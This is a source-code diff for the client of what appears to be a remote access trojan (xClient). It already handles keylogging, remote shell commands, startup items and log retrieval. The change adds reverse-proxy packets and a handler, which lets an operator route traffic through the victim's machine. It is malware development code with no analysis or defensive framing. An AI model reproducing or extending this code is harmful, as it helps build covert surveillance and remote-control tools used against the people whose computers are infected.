@@ -7,6 +7,7 @@ using xClient.Core;
 using xClient.Core.Commands;
 using xClient.Core.Keylogger;
 using xClient.Core.Packets;
+using xClient.Core.ReverseProxy;
 
 namespace xClient
 {
@@ -89,7 +90,11 @@ namespace xClient
                 typeof (Core.Packets.ClientPackets.MonitorsResponse),
                 typeof (Core.Packets.ClientPackets.ShellCommandResponse),
                 typeof (Core.Packets.ClientPackets.GetStartupItemsResponse),
-                typeof (Core.Packets.ClientPackets.GetLogsResponse)
+                typeof (Core.Packets.ClientPackets.GetLogsResponse),
+                typeof (Core.ReverseProxy.Packets.ReverseProxy_Connect),
+                typeof (Core.ReverseProxy.Packets.ReverseProxy_ConnectResponse),
+                typeof (Core.ReverseProxy.Packets.ReverseProxy_Data),
+                typeof (Core.ReverseProxy.Packets.ReverseProxy_Disconnect)
             });
 
             ConnectClient.ClientState += ClientState;
@@ -321,7 +326,14 @@ namespace xClient
             }
             else if (type == typeof(Core.Packets.ServerPackets.GetLogs))
             {
-                CommandHandler.HandleGetLogs((Core.Packets.ServerPackets.GetLogs) packet, client);
+                CommandHandler.HandleGetLogs((Core.Packets.ServerPackets.GetLogs)packet, client);
+            }
+            else if (type == typeof(Core.ReverseProxy.Packets.ReverseProxy_Connect) ||
+                     type == typeof(Core.ReverseProxy.Packets.ReverseProxy_ConnectResponse) ||
+                     type == typeof(Core.ReverseProxy.Packets.ReverseProxy_Data) ||
+                     type == typeof(Core.ReverseProxy.Packets.ReverseProxy_Disconnect))
+            {
+                ReverseProxyCommandHandler.HandleCommand(client, packet);
             }
         }
     }
